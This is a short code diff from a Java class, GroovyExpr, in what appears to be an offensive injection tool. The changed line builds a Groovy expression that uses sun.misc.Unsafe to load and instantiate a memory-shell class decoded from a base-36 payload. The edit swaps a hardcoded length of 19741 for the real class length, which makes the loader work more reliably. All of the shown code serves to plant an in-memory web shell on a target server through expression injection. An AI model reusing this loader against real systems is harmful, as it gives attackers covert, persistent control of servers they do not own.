@@ -51,7 +51,7 @@ public class GroovyExpr implements IExpr {
         try {
             MemShellClassFactory classFactory4 = new MemShellClassFactory(memShellClass, MemShellClassFactory.BIGINTEGER);
             return new String[]{
-                    out("def ss(a) { a.setAccessible(true);return a};def db(a) { return new java.math.BigInteger(a,36).toByteArray()};ss(sun.misc.Unsafe.class.getDeclaredField(\"theUnsafe\")).get(null).defineClass(\"" + classFactory4.getClassName() + "\",db(\"" + classFactory4.getPayload() + "\"),0,19741,null,null).newInstance()")
+                    out("def ss(a) { a.setAccessible(true);return a};def db(a) { return new java.math.BigInteger(a,36).toByteArray()};ss(sun.misc.Unsafe.class.getDeclaredField(\"theUnsafe\")).get(null).defineClass(\"" + classFactory4.getClassName() + "\",db(\"" + classFactory4.getPayload() + "\"),0," + memShellClass.length + ",null,null).newInstance()")
             };
         } catch (Exception e) {
             return new String[]{
